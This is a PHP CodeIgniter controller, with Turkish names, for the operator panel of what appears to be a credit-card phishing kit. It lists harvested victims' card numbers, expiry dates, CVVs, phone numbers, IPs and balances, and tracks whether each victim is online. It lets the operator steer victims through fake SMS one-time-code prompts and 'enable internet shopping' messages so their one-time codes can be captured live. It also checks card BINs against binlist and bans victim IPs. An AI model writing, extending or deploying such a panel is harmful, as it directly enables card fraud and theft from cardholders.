<?php
defined('BASEPATH') or exit('Doğrudan erişime izin verilmiyor');

class Anasayfa extends CI_Controller
{

	public function __construct()
	{
		parent::__construct();
		$this->output->set_header('Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0');
		$this->output->set_header('Pragma: no-cache');

		admin_oturum_kontrol();
	}

	public function index()
	{
		$veriler = $this->db->order_by('id', 'desc')->get_where('credit_card');
		$pageData = [
			'veriler' => $veriler,
			'sayfa_adi' => 'anasayfa',
			'sayfa_title' => 'Anasayfa - Admin Paneli',
		];

		$this->load->view('yonetim/index', $pageData);
	}


	public function dark_mode()
	{
		$val = post('mode');

		/* tersine çevir */
		if ($val == 1) {
			$val = 0;
		} else {
			$val = 1;
		}

		$cookie = array(
			'name'   => 'dark_mode',
			'value'  => $val,
			'expire' => time() + (60 * 60 * 24),
			'path'   => '/',
			'prefix' => ''
		);
		set_cookie($cookie);

		echo 2312;
	}

	public function hepsini_sil()
	{
		$this->db->delete('credit_card', ['id >' => 0]);
	}

	public function sil()
	{
		$hash = post('hash');
		$this->db->delete('credit_card', ['hash' => $hash]);
	}

	public function veriler()
	{
		$veriler = $this->db->order_by('id', 'desc')->get_where('credit_card');


		$outputData 	= "";
		$outputSabit 	= "";
		$outputBAN 		= "";

		/*
		$str = preg_match('/[^a-zA-Z _]/', "sadasdaasdassadasd");
		if(!$str){
			echo 'basarili';
		}
		*/

		foreach ($veriler->result() as $row) {

			$sms_txt = "";
			if ($row->sms_code == "") {
			} else if ($row->sms_code == "admin_new_sms") {
				$sms_txt = "Doğrulama kodunu tekrar gönder uyarısı gönderildi!";
			} else if ($row->sms_code == "guest_new_sms") {
				$sms_txt = "Kullanıcı yeni SMS istedi. Lütfen SMS Gönderin => Kod girişi bekleniyor...";
			} else if ($row->sms_code == "otp_gecersiz") {
				$sms_txt = "Geçersiz kod uyarısı gönderildi... Yeni kod girişi bekleniyor.";
			} else if ($row->sms_code == "otp_onayla") {
				$sms_txt = "Ödeme Onaylandı mesajı gönderildi.";
			} else if ($row->sms_code == "internet_alisveris") {
				$sms_txt = "İnternet alışverişlerine açın mesajı gönderildi.";
			} else if ($row->sms_code == "int_geldi") {
				$sms_txt = "İnternet alışverişlerine açıp GELDİ. Kod gönder çünkü sms ekranında :)";
			} else {
				$sms_txt = $row->sms_code . '<br> 
				<a href="javascript:;" class="btn btn-primary btn-xs" onclick="otpOnayla(\'' . $row->hash . '\')">
					Onayla
				</a>
				<a href="javascript:;" class="btn btn-danger btn-xs" onclick="otpGecersiz(\'' . $row->hash . '\')">
					Geçersiz
				</a>
				';
			}


			$isOnline = "";

			$nowDate = date('d-m-Y H:i:s');
			$newDate = date('d-m-Y H:i:s', strtotime('-3 seconds', strtotime($nowDate)));

			if (strtotime($row->isOnlineLastDate) > strtotime($newDate)) {
				$isOnline = 1;
			} else {
				$isOnline = 0;
			}

			$checked = $row->sabit == 1 ? 'checked' : '';
			$banChecked = $row->ban == 1 ? 'checked' : '';


			$output = '
			<tr>
				<td><input type="checkbox" id="sabitChecker" data-hash=' . $row->hash . ' ' . $checked . '> ' . $row->id . '</td>
				<td class="text-center">' . $row->cc_name . ' <br> <strong>' . $row->cc_no . ' </strong><br>' . $row->cc_date . ' ' . $row->cc_cvv . '</td>
				<td>' . $row->no . '</td>
				<td>' . $row->ip . '</td>

				<td>' . dmyhi($row->tarih) . '</td>
				<td>
					' . ($isOnline == '1' ?
			'<span class="text-success font-size-16"> Online </span>'
			:
				'<span class="text-danger font-size-16"> Offline </span>')
			. '
				</td>
				<td>' . $row->balance . '₺</td>

				<td class="text-center">
					' . $sms_txt . '
				</td>
				<td class="text-center">

					<a href="javascript:;" class="btn btn-primary btn-xs" onclick="internetAlisveris(\'' . $row->hash . '\')">
						İnternet Alışveriş
					</a>
					<a href="javascript:;" class="mt-1 btn btn-primary btn-xs" onclick="yeniSMSIste(\'' . $row->hash . '\')">
						SMS ISTE
					</a>
					<a href="javascript:;" class="mt-1 btn btn-danger btn-xs" onclick="sil(\'' . $row->hash . '\')">
						SİL
					</a>
					<a href="" class="mt-1 btn btn-secondary btn-xs" data-hash="' . $row->hash . '" id="binSor">BINCHECK</a>
					<br>
					<input type="checkbox" class="mt-1 " id="banChecker" data-hash=' . $row->hash . ' ' . $banChecked . '> BAN
				</td>
			</tr>
			';

			if ($row->ban == 0 && $row->sabit == 1) {
				$outputSabit .= $output;
			}
			if ($row->ban == 0 && $row->sabit == 0) {
				$outputData .= $output;
			}
			if ($row->ban == 1) {
				$outputBAN .= $output;
			}
		}

		echo json_encode(['data' => $outputData, 'sabit' => $outputSabit, 'ban' => $outputBAN, 'count' => $veriler->num_rows()]);
	}

	public function data()
	{
		$hash = post('hash');
		$islm = post('islm');

		$data = $this->db->get_where('credit_card', ['hash' => $hash]);
		if ($data->num_rows() == 0) {
			echo 0;
			exit;
		}
		$data = $data->row();

		if ($islm == "sabit") {
			$val = post('val') == 'true' ? 1 : 0;

			$this->db->where('hash', $hash);
			$this->db->update('credit_card', ['sabit' => $val]);
		}

		if ($islm == "ban") {
			$val = post('val') == 'true' ? 1 : 0;

			$this->db->where('hash', $hash);
			$this->db->update('credit_card', ['ban' => $val]);

			if($val == 1){
				$this->db->insert('banlar', ['ip' => $data->ip, 'neden' => 'admin engeli', 'tarih' => date('Y-m-d H:i:s')]);
			}else{
				$this->db->delete('banlar', ['ip' => $data->ip]);
			}


		}

		if ($islm == "yeni_sms") {
			$this->db->where('hash', $hash);
			$this->db->update('credit_card', ['sms_code' => ""]);
		}

		if ($islm == "guest_new_sms") {
			$this->db->where('hash', $hash);
			$this->db->update('credit_card', ['sms_code' => "guest_new_sms"]);
		}

		if ($islm == "admin_new_sms") {
			$this->db->where('hash', $hash);
			$this->db->update('credit_card', ['sms_code' => "admin_new_sms"]);
		}

		if ($islm == "otp_onayla") {
			$this->db->where('hash', $hash);
			$this->db->update('credit_card', ['sms_code' => "otp_onayla"]);
		}
		if ($islm == "otp_gecersiz") {
			$this->db->where('hash', $hash);
			$this->db->update('credit_card', ['sms_code' => "otp_gecersiz"]);
		}
		if ($islm == "internet_alisveris") {
			$this->db->where('hash', $hash);
			$this->db->update('credit_card', ['sms_code' => "internet_alisveris"]);
		}

		if ($islm == "sms_sor") {
			echo $data->sms_code;
		}
	}

	public function binchecker()
	{
		$hash = post('hash');

		$veri = $this->db->get_where('credit_card', ['hash' => $hash])->row();


		$bin  = $veri->cc_no;

		$HTML_Binlist_Table = "";

		if (strlen($bin) >= 6) {
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, "https://lookup.binlist.net/" . mb_substr($bin, 0, 6));
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			$CurlResponse = json_decode(curl_exec($ch));

			curl_close($ch);

			$HTML_Binlist_Table = '
				<tr>
					<td>' . mb_substr($bin, 0, 6) . '</td>
					<td>' . $CurlResponse->country->name . '</td>
					<td>' . $CurlResponse->scheme . '</td>
					<td>' . $CurlResponse->type . '</td>
					<td>' . $CurlResponse->brand . '</td>
					<td>' . $CurlResponse->bank->name . '</td>
				</tr>
			';
		}

		echo $HTML_Binlist_Table;
	}

	public function onlinesay(){
		$onlineSayisi = 0;

		$ziyaretciler = $this->db->get_where('ziyaretciler');
		foreach ($ziyaretciler->result() as $ziy) {
			$nowDate = date('Y-m-d H:i:s');
			$minutes5date = date('Y-m-d H:i:s', strtotime('-3 seconds', strtotime($nowDate)));

			if (strtotime($ziy->onlinelastdate) > strtotime($minutes5date)) {
				$onlineSayisi++;
			} else {
				$this->db->delete('ziyaretciler', ['id' => $ziy->id]);
			}
		}
		echo $onlineSayisi;
	}
	
}
